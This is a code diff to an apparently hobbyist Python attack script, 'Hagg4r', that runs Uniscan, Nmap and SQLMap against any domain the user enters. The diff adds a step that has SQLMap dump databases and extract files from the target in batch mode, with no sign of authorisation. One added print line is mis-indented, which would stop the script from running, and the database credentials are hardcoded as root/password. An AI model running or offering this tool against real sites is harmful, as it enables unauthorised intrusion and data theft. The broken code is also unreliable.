@@ -1,4 +1,4 @@
-print("Hagg4r 🫵👺")
+print("Hagg4r 👺")
 import os
 import subprocess
 import requests
@@ -87,7 +87,7 @@ def get_ip_info(ip):
 
 def scan_with_uniscan(target):
     """Run Uniscan on the target."""
-    command = ["uniscan", "-u", target]
+    command = ["uniscan", "-u", target, "-qweds"]
     stdout, stderr = run_command(command)
     save_to_file("uniscan_results.txt", stdout)
     if stderr:
@@ -96,7 +96,7 @@ def scan_with_uniscan(target):
 
 def scan_with_nmap(target):
     """Run Nmap on the target."""
-    command = ["nmap", "-v", target]
+    command = ["nmap", "-sV", target]
     stdout, stderr = run_command(command)
     save_to_file("nmap_results.txt", stdout)
     if stderr:
@@ -110,6 +110,19 @@ def scan_with_sqlmap(target):
     save_to_file("sqlmap_results.txt", stdout)
     if stderr:
         save_to_file("sqlmap_errors.txt", stderr)
+    return stdout, stderr
+
+def extract_files_from_db(target):
+    """Extract files from a database using SQLMap."""
+    # Adjust the command to specify the file extraction options
+    command = [
+        "sqlmap", "-u", target, "--batch", "--dump", "--output-dir=output",
+        "--technique=BEUSTQ", "--files"  # Modify options based on what you need
+    ]
+    stdout, stderr = run_command(command)
+    save_to_file("sqlmap_file_extraction_results.txt", stdout)
+    if stderr:
+        save_to_file("sqlmap_file_extraction_errors.txt", stderr)
     return stdout, stderr
 
 def run_whois(domain):
@@ -148,19 +161,20 @@ def main():
     Main function to orchestrate the scans.
     - Installs required tools.
     - Runs Uniscan, Nmap, SQLMap, Whois, and Subfinder on the target.
-    - Retrieves IP information and logs the results to a file and database.
+    - Extracts files from a database and logs the results to a file and database.
     """
     clear_screen()
     print_header()
     
     install_tools()
     
-    target = input("Enter the target IP or domain: ")
+    target = input("Enter the domain: ")
     print(f"Target: {target}")
     
+    # Run scans
     print("\n[1] Running Uniscan...")
     uniscan_stdout, uniscan_stderr = scan_with_uniscan(target)
-    print(uniscan_stdout)
+        print(uniscan_stdout)
     
     print("\n[2] Running Nmap...")
     nmap_stdout, nmap_stderr = scan_with_nmap(target)
@@ -170,17 +184,19 @@ def main():
     sqlmap_stdout, sqlmap_stderr = scan_with_sqlmap(target)
     print(sqlmap_stdout)
     
-    print("\n[4] Running Whois...")
+    print("\n[4] Extracting files from database with SQLMap...")
+    file_extraction_stdout, file_extraction_stderr = extract_files_from_db(target)
+    print(file_extraction_stdout)
+    
+    print("\n[5] Running Whois...")
     whois_stdout, whois_stderr = run_whois(target)
     print(whois_stdout)
     
-    print("\n[5] Running Subfinder...")
+    print("\n[6] Running Subfinder...")
     subfinder_stdout, subfinder_stderr = run_subfinder(target)
     print(subfinder_stdout)
     
-    
-    
-    # Log results to the database
+    # Define database connection parameters
     db_host = "localhost"
     db_user = "root"
     db_password = "password"
@@ -191,9 +207,9 @@ def main():
         log_to_database(db_host, db_user, db_password, db_name, uniscan_stdout)
         log_to_database(db_host, db_user, db_password, db_name, nmap_stdout)
         log_to_database(db_host, db_user, db_password, db_name, sqlmap_stdout)
+        log_to_database(db_host, db_user, db_password, db_name, file_extraction_stdout)
         log_to_database(db_host, db_user, db_password, db_name, whois_stdout)
         log_to_database(db_host, db_user, db_password, db_name, subfinder_stdout)
-        log_to_database(db_host, db_user, db_password, db_name, str(ip_info))
     except Exception as e:
         print(f"An error occurred while logging to the database: {e}")
 
